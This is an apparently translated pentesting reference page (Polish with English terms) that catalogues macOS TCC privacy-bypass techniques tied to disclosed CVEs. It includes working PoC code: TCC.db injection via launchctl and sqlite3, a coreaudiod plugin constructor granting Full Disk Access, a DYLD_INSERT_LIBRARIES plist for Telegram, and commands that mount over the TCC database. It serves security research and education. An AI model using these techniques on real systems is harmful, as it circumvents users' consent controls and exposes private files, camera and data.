# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Według funkcjonalności

### Write Bypass

To nie jest bypass, tylko sposób działania TCC: **nie chroni przed zapisem**. Jeśli Terminal **nie ma dostępu do odczytu Desktop użytkownika, nadal może zapisywać w tym miejscu**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Atrybut rozszerzony **`com.apple.macl`** jest dodawany do nowego **file**, aby zapewnić **creators app** dostęp do jego odczytu.

### TCC ClickJacking

Możliwe jest **umieszczenie okna nad komunikatem TCC**, aby nakłonić użytkownika do **zaakceptowania** go bez jego świadomości. PoC znajdziesz w [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker może **tworzyć apps o dowolnej nazwie** (np. Finder, Google Chrome...) w **`Info.plist`** i sprawić, aby żądały dostępu do lokalizacji chronionej przez TCC. Użytkownik pomyśli, że to legit application żąda tego dostępu.\
Co więcej, możliwe jest **usunięcie legit app z Docka i umieszczenie w nim fake one**, aby po kliknięciu przez użytkownika fake one (który może używać tej samej ikony) wywołała legit one, poprosiła o uprawnienia TCC i uruchomiła malware, sprawiając, że użytkownik uwierzy, iż dostęp zażądała legit app.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Więcej informacji i PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Domyślnie dostęp przez **SSH miał "Full Disk Access"**. Aby go wyłączyć, musi być widoczny na liście, ale wyłączony (usunięcie go z listy nie usunie tych uprawnień):

![TCC Request by arbitrary name - SSH Bypass: Domyślnie dostęp przez SSH miał "Full Disk Access". Aby go wyłączyć, musi być widoczny na liście, ale wyłączony (usunięcie go...](<../../../../../images/image (1077).png>)

Tutaj znajdziesz przykłady, jak niektóre **malwares potrafiły ominąć tę ochronę**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Pamiętaj, że obecnie, aby móc włączyć SSH, potrzebujesz **Full Disk Access**

### Handle extensions - CVE-2022-26767

Atrybut **`com.apple.macl`** jest nadawany plikom, aby zapewnić **określonej aplikacji uprawnienia do ich odczytu.** Atrybut ten jest ustawiany podczas **drag\&drop** pliku na aplikację lub gdy użytkownik **klika dwukrotnie** plik, aby otworzyć go za pomocą **default application**.

Użytkownik mógłby więc **zarejestrować malicious app** do obsługi wszystkich rozszerzeń i wywołać Launch Services, aby **otworzyć** dowolny plik (dzięki czemu malicious file otrzyma dostęp do jego odczytu).

### iCloud

Dzięki entitlement **`com.apple.private.icloud-account-access`** możliwe jest komunikowanie się z usługą XPC **`com.apple.iCloudHelper`**, która **udostępnia iCloud tokens**.

**iMovie** i **Garageband** miały ten entitlement oraz inne, które na to pozwalały.

Więcej **informacji** o exploicie umożliwiającym **uzyskanie icloud tokens** dzięki temu entitlement znajdziesz w prelekcji: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Aplikacja z uprawnieniem **`kTCCServiceAppleEvents`** będzie mogła **sterować innymi Apps**. Oznacza to, że może być w stanie **abuse'ować uprawnienia przyznane innym Apps**.

Więcej informacji o Apple Scripts znajdziesz tutaj:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na przykład, jeśli App ma **Automation permission dla `iTerm`**, to w tym przykładzie **`Terminal`** ma dostęp do iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, który nie ma FDA, może wywołać iTerm, który je posiada, i użyć go do wykonania działań:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Przez Finder

Jeśli aplikacja ma dostęp za pośrednictwem Findera, może uruchomić skrypt taki jak ten:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Według zachowania aplikacji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon** używał zmiennej **`HOME`** **env** do uzyskiwania dostępu do bazy danych użytkowników TCC z: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Zgodnie z [tym wpisem na Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), a także dlatego, że TCC daemon jest uruchamiany przez **`launchd`** w domenie bieżącego użytkownika, możliwe jest **kontrolowanie wszystkich zmiennych środowiskowych** przekazywanych do niego.\
W związku z tym **attacker mógł ustawić zmienną środowiskową `$HOME`** w **`launchctl`**, aby wskazywała na **kontrolowany** **katalog**, zrestartować **TCC** daemon, a następnie **bezpośrednio zmodyfikować bazę danych TCC**, przyznając sobie **każde dostępne uprawnienie TCC**, bez wyświetlania użytkownikowi końcowemu jakiegokolwiek promptu.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes miała dostęp do lokalizacji chronionych przez TCC, ale gdy tworzona jest notatka, jest ona **tworzona w niechronionej lokalizacji**. Można więc było poprosić Notes o skopiowanie chronionego pliku do notatki (czyli do niechronionej lokalizacji), a następnie uzyskać dostęp do tego pliku:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` wraz z biblioteką `libsecurity_translocate` miał entitlement `com.apple.private.nullfs_allow`, który umożliwiał tworzenie mountów **nullfs**, oraz entitlement `com.apple.private.tcc.allow` z **`kTCCServiceSystemPolicyAllFiles`**, umożliwiający dostęp do każdego pliku.

Można było dodać atrybut quarantine do katalogu "Library", wywołać usługę XPC **`com.apple.security.translocation`**, a następnie mapowała ona Library do **`$TMPDIR/AppTranslocation/d/d/Library`**, gdzie wszystkie dokumenty znajdujące się w Library mogły być **dostępne**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ma interesującą funkcję: gdy działa, **importuje** pliki upuszczone do **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** do "biblioteki multimediów" użytkownika. Ponadto wywołuje coś w rodzaju: **`rename(a, b);`**, gdzie `a` i `b` mają wartości:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

To zachowanie **`rename(a, b);`** jest podatne na **Race Condition**, ponieważ można umieścić w folderze `Automatically Add to Music.localized` fałszywy plik **TCC.db**, a następnie, gdy zostanie utworzony nowy folder (b), skopiować plik, usunąć go i wskazać go na **`~/Library/Application Support/com.apple.TCC`**/.
**More info** [**in the writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Jeśli ustawiono **`SQLITE_SQLLOG_DIR="path/folder"`**, oznacza to zasadniczo, że **każda otwarta baza danych jest kopiowana do tej ścieżki**. W tym CVE wykorzystano tę funkcję do **zapisu** wewnątrz **bazy danych SQLite**, która ma zostać **otwarta przez proces posiadający FDA na bazę TCC**, a następnie wykorzystano **`SQLITE_SQLLOG_DIR`** z **symlinkiem w nazwie pliku**, aby po **otwarciu** tej bazy użytkownika plik **TCC.db został nadpisany** otwartą bazą.\
**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Jeśli ustawiona jest zmienna środowiskowa **`SQLITE_AUTO_TRACE`**, biblioteka **`libsqlite3.dylib`** rozpocznie **logowanie** wszystkich zapytań SQL. Wiele aplikacji korzystało z tej biblioteki, więc możliwe było logowanie wszystkich ich zapytań SQLite.

Kilka aplikacji Apple korzystało z tej biblioteki w celu uzyskiwania dostępu do informacji chronionych przez TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Ta **zmienna środowiskowa jest używana przez framework `Metal`**, który jest zależnością różnych programów, przede wszystkim `Music`, który ma FDA.

Ustawienie: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Jeśli `path` jest prawidłowym katalogiem, bug zostanie wywołany i możemy użyć `fs_usage`, aby zobaczyć, co dzieje się w programie:

- plik zostanie otwarty za pomocą `open()`, pod nazwą `path/.dat.nosyncXXXX.XXXXXX` (X jest losowe)
- jeden lub więcej wywołań `write()` zapisze zawartość do pliku (nie mamy nad tym kontroli)
- `path/.dat.nosyncXXXX.XXXXXX` zostanie zmieniony za pomocą `rename()` na `path/name`

To zapis do pliku tymczasowego, po którym następuje **`rename(old, new)`**, które **nie jest bezpieczne**.

Nie jest bezpieczne, ponieważ musi **osobno rozwiązać stare i nowe ścieżki**, co może zająć trochę czasu i być podatne na Race Condition. Więcej informacji można znaleźć w funkcji `renameat_internal()` w `xnu`.

> [!CAUTION]
> Zasadniczo, jeśli uprzywilejowany proces zmienia nazwę pliku w folderze, nad którym masz kontrolę, możesz wygrać RCE i sprawić, że uzyska dostęp do innego pliku lub, tak jak w tym CVE, otworzy plik utworzony przez uprzywilejowaną aplikację i zachowa FD.
>
> Jeśli operacja rename uzyskuje dostęp do folderu, nad którym masz kontrolę, a Ty zmodyfikowałeś plik źródłowy lub masz do niego FD, możesz zmienić plik docelowy (lub folder), aby wskazywał na symlink, dzięki czemu będziesz mógł zapisywać w dowolnym momencie.

Tak wyglądał atak w tym CVE. Na przykład, aby nadpisać `TCC.db` użytkownika, możemy:

- utworzyć `/Users/hacker/ourlink` wskazujący na `/Users/hacker/Library/Application Support/com.apple.TCC/`
- utworzyć katalog `/Users/hacker/tmp/`
- ustawić `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- wywołać bug, uruchamiając `Music` z tą zmienną środowiskową
- przechwycić `open()` pliku `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X jest losowe)
- tutaj również otworzyć ten plik do zapisu i zachować deskryptor pliku
- atomowo przełączać `/Users/hacker/tmp` z `/Users/hacker/ourlink` **w pętli**
- robimy to, aby zmaksymalizować szanse powodzenia, ponieważ okno czasowe Race Condition jest bardzo krótkie, ale przegranie wyścigu ma znikome negatywne konsekwencje
- chwilę poczekać
- sprawdzić, czy mieliśmy szczęście
- jeśli nie, rozpocząć ponownie od początku

Więcej informacji na [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Obecnie, jeśli spróbujesz użyć zmiennej środowiskowej `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacje się nie uruchomią.

### Apple Remote Desktop

Jako root możesz włączyć tę usługę, a **agent ARD będzie miał full disk access**, co następnie może zostać wykorzystane przez użytkownika do skopiowania nowej **bazy użytkownika TCC**.

## Według **NFSHomeDirectory**

TCC używa bazy danych w folderze HOME użytkownika do kontrolowania dostępu do zasobów właściwych dla użytkownika: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Dlatego jeśli użytkownik zdoła ponownie uruchomić TCC ze zmienną środowiskową $HOME wskazującą na **inny folder**, może utworzyć nową bazę TCC w **/Library/Application Support/com.apple.TCC/TCC.db** i nakłonić TCC do przyznania dowolnej aplikacji dowolnego uprawnienia TCC.

> [!TIP]
> Należy pamiętać, że Apple używa ustawienia zapisanego w profilu użytkownika, w atrybucie **`NFSHomeDirectory`**, jako **wartości `$HOME`**. Jeśli więc przejmiesz kontrolę nad aplikacją mającą uprawnienia do modyfikowania tej wartości (**`kTCCServiceSystemPolicySysAdminFiles`**), możesz **weaponize** tę opcję za pomocą TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Pierwszy POC** używa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) do modyfikacji folderu **HOME** użytkownika.

1. Uzyskaj blob _csreq_ dla docelowej aplikacji.
2. Umieść spreparowany plik _TCC.db_ z wymaganym dostępem i blobem _csreq_.
3. Wyeksportuj wpis Directory Services użytkownika za pomocą [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Zmodyfikuj wpis Directory Services, aby zmienić katalog domowy użytkownika.
5. Zaimportuj zmodyfikowany wpis Directory Services za pomocą [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zatrzymaj _tccd_ użytkownika i uruchom ponownie proces.

Drugi POC używał **`/usr/libexec/configd`**, który miał `com.apple.private.tcc.allow` z wartością `kTCCServiceSystemPolicySysAdminFiles`.\
Możliwe było uruchomienie **`configd`** z opcją **`-t`**, dzięki której attacker mógł wskazać **custom Bundle do załadowania**. Dlatego exploit **zastępuje** metodę zmiany katalogu domowego użytkownika za pomocą **`dsexport`** i **`dsimport`** przez **code injection w `configd`**.

Więcej informacji można znaleźć w [**oryginalnym raporcie**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Przez process injection

Istnieją różne techniki wstrzykiwania kodu do procesu i nadużywania jego uprawnień TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Co więcej, najczęściej spotykany process injection używany do obejścia TCC odbywa się za pośrednictwem **pluginów (load library)**.\
Pluginy to dodatkowy kod, zwykle w formie bibliotek lub plików plist, który jest **ładowany przez główną aplikację** i wykonywany w jej kontekście. Dlatego jeśli główna aplikacja miała dostęp do plików ograniczonych przez TCC (za pośrednictwem przyznanych uprawnień lub entitlements), **custom code również będzie go mieć**.

### CVE-2020-27937 - Directory Utility

Aplikacja `/System/Library/CoreServices/Applications/Directory Utility.app` miała entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ładowała pluginy z rozszerzeniem **`.daplug`** i **nie miała hardened** runtime.

Aby weaponize'ować to CVE, **`NFSHomeDirectory`** jest **zmieniany** (przez nadużycie poprzedniego entitlement), aby umożliwić **przejęcie bazy TCC użytkownika** i ominięcie TCC.

Więcej informacji można znaleźć w [**oryginalnym raporcie**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** miał entitlements `com.apple.security.cs.disable-library-validation` oraz `com.apple.private.tcc.manager`. Pierwszy **umożliwiał code injection**, a drugi zapewniał mu dostęp do **zarządzania TCC**.

Binary ten umożliwiał ładowanie **third party plug-ins** z folderu `/Library/Audio/Plug-Ins/HAL`. Dlatego możliwe było **załadowanie pluginu i nadużycie uprawnień TCC** za pomocą tego POC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Więcej informacji znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Wtyczki Device Abstraction Layer (DAL)

Aplikacje systemowe, które otwierają strumień kamery za pośrednictwem Core Media I/O (aplikacje z **`kTCCServiceCamera`**), ładują w procesie te wtyczki znajdujące się w `/Library/CoreMediaIO/Plug-Ins/DAL` (nie są objęte ograniczeniami SIP).

Samo umieszczenie w tym miejscu biblioteki ze standardowym **constructorem** wystarczy do **wstrzyknięcia kodu**.

Kilka aplikacji Apple było podatnych na tę technikę.

### Firefox

Aplikacja Firefox posiadała entitlements `com.apple.security.cs.disable-library-validation` oraz `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Więcej informacji o tym, jak łatwo to wykorzystać, znajdziesz w [**oryginalnym raporcie**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` miał entitlements **`com.apple.private.tcc.allow`** oraz **`com.apple.security.get-task-allow`**, co pozwalało wstrzyknąć code do procesu i użyć uprawnień TCC.

### CVE-2023-26818 - Telegram

Telegram miał entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** oraz **`com.apple.security.cs.disable-library-validation`**, więc można było go wykorzystać do **uzyskania dostępu do jego uprawnień**, takich jak nagrywanie za pomocą kamery. [**Payload znajdziesz w writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Zwróć uwagę, że aby użyć zmiennej środowiskowej do załadowania library, utworzono **custom plist** w celu wstrzyknięcia tej library, a następnie użyto **`launchctl`** do jej uruchomienia:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Za pomocą wywołań open

Możliwe jest wywołanie **`open`** nawet w sandboxie.

### Skrypty Terminal

Dość często nadaje się Terminalowi **Full Disk Access (FDA)**, przynajmniej na komputerach używanych przez osoby techniczne. Możliwe jest również wywoływanie za jego pomocą skryptów **`.terminal`**.

Skrypty **`.terminal`** to pliki plist, takie jak ten, zawierające polecenie do wykonania w kluczu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacja mogłaby zapisać skrypt terminala w lokalizacji takiej jak `/tmp` i uruchomić go za pomocą polecenia takiego jak:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Przez montowanie

### CVE-2020-9771 - mount_apfs TCC bypass i privilege escalation

**Każdy użytkownik** (nawet bez uprawnień) może utworzyć i zamontować snapshot Time Machine oraz uzyskać **dostęp do WSZYSTKICH plików** tego snapshotu.\
**Jedyne wymagane uprawnienie** dotyczy używanej aplikacji (np. `Terminal`), która musi mieć dostęp **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`); dostęp ten musi zostać przyznany przez administratora.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Bardziej szczegółowe wyjaśnienie można znaleźć w [**oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 i CVE-2021-30808 - Mount over TCC file

Nawet jeśli plik bazy danych TCC był chroniony, możliwe było **zamontowanie nowego pliku TCC.db w tym katalogu**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Sprawdź **pełny exploit** w [**oryginalnym opisie**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Jak wyjaśniono w [oryginalnym opisie](https://www.kandji.io/blog/macos-audit-story-part2), ten CVE wykorzystywał `diskarbitrationd`.

Funkcja `DADiskMountWithArgumentsCommon` z public frameworka `DiskArbitration` wykonywała kontrole bezpieczeństwa. Można je jednak ominąć, wywołując bezpośrednio `diskarbitrationd`, a następnie używać elementów `../` w ścieżce i symlinków.

Pozwalało to atakującemu wykonywać dowolne mounty w dowolnej lokalizacji, w tym nad bazą danych TCC, ze względu na entitlement `com.apple.private.security.storage-exempt.heritable` procesu `diskarbitrationd`.

### asr

Narzędzie **`/usr/sbin/asr`** umożliwiało skopiowanie całego dysku i zamontowanie go w innym miejscu, z pominięciem zabezpieczeń TCC.

### Location Services

Istnieje trzecia baza danych TCC w **`/var/db/locationd/clients.plist`**, wskazująca klientów uprawnionych do **uzyskiwania dostępu do usług lokalizacyjnych**.\
Folder **`/var/db/locationd/` nie był chroniony przed montowaniem DMG**, dlatego możliwe było zamontowanie własnego pliku plist.

## Za pomocą aplikacji uruchamianych przy starcie


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Za pomocą grep

W wielu przypadkach pliki przechowują poufne informacje, takie jak adresy e-mail, numery telefonów, wiadomości... w lokalizacjach, które nie są chronione (co Apple uznaje za podatność).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

To już nie działa, ale [**w przeszłości działało**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Inny sposób z użyciem [**zdarzeń CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referencje

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
